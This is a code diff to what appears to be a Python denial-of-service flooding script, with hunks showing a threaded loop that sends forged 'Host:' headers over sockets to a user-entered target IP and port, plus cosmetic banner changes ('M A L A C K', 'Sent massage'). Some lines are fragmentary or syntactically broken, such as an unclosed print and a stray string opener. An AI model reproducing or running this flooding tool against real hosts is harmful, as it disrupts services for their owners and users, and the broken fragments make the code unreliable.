@@ -5,10 +5,9 @@ import socket
 import threading
 import time
 from colorama import Fore, Style
-def ddos():
+def DDoS():
     os.system("clear")
-    print(f"{Fore.LIGHTBLUE_EX}
-    print("press CTRL + C and press ENTER to exit !!!")
+    print("press CTRL + C and press ENTER to exit !!")
     while True:
         try:
             threads = int(input("ENTER NUMBER OF THREADS : "))
@@ -52,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[💥]  \033[93mTL-DD0S  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+                print(f"{Fore.LIGHTMAGENTA_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K \033[103mSent massage\033[0m  \033["+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
@@ -63,6 +62,7 @@ def ddos():
         thread.start()
 def print_red_centered_art():
     os.system("clear")
+    art = '''
     print("""
 └>
 ╔═ ║  ═╗
